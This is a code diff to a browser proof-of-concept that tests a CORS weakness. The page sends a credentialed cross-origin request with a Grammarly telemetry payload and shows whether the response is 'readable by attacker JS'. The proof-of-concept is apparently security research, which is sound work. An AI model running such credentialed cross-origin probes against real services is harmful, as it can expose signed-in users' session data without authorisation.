@@ -12,12 +12,27 @@
       mode: "cors",
       credentials: "include",
       headers: {
-        "Content-Type": "application/json".
-        "Origin": "https://www.jevqsarmsuperhuman.com"
+        "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        test: "cors-poc",
-        marker: "attacker-controlled-origin"
+        events: [
+          {
+            eventName: "cms/web-heartbeat",
+            batchId: 2,
+            instanceId: "F825AnnA",
+            pageHeartbeatSeconds: 2.234,
+            pageSlug: "signin",
+            clientName: "cms",
+            pageUrl: "https://www.grammarly.com/signin?is_sso=true",
+            domainName: "www.grammarly.com",
+            pageViewId: "d5c4a43a-c45d-4de2-b7ef-be777afd2c2c",
+            timestamp: Date.now(),
+            webSessionId: "69ffe323-7b59-4606-b933-251a81fa79f4",
+            referrer: "",
+            containerId: "jrfcavpobatu0980",
+            isUnload: true
+          }
+        ]
       })
     });
 
@@ -26,7 +41,8 @@
     document.getElementById("result").textContent =
       "Status: " + r.status + "\n" +
       "Response readable by attacker JS: YES\n\n" +
-      body;
+      "Response body:\n" +
+      (body || "[empty response body]");
 
   } catch (e) {
     document.getElementById("result").textContent =
